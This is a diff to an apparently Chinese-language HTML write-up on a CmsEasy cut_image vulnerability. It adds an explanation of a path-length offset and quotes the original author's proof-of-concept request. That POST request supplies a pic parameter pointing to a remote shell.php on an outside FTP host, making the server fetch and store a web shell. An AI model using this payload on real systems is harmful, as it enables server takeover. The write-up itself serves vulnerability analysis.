@@ -297,11 +297,41 @@ $new_name = $new_name_gbk = str_replace('.','',Time::getMicrotime()).'.'.end(exp
                     <div class="col-lg-12">
                         <p class="lead"> 
                              而 easycms 的頁面都存在 cms 的子目錄裡，這時候就要 strlen( base_url ) + 2<br>
-                             所以是 <font color="blue">strlen('cms')</font>，所以就是 <font color="red">5</font> 
+                             所以是 <font color="blue">strlen('cms')</font>，所以就是 <font color="red">5</font>，之後就設圖片的長寬那些
                         </p>
                     </div>
                 </div>
 
+
+                <div class="row">
+                    <div class="col-lg-12">
+                        <p class="lead"> 
+                             以作者本身的範例 "<font color="blue">http://192.168.1.170/cmseasy</font> " 來說，作者的POC 就是...
+                        </p>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col-lg-12">
+<pre>
+<code class="bash"> 
+POST /index.php?case=tool&act=cut_image
+pic=111111111ftp://ludas.pw/shell.php&w=228&h=146&x1=0&x2=228&y1=0&y2=146
+
+</code>
+</pre>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col-lg-2"></div>
+                    <div class="col-lg-8">
+                        <div id="page-wrapper">
+                            <img class="img-thumbnail" src="2016-11-14/xianzhi.png" >
+                        </div>
+                    </div>
+                    <div class="col-lg-2"></div>
+                </div><br>
 
 
                 <!-- Page Contect End -->
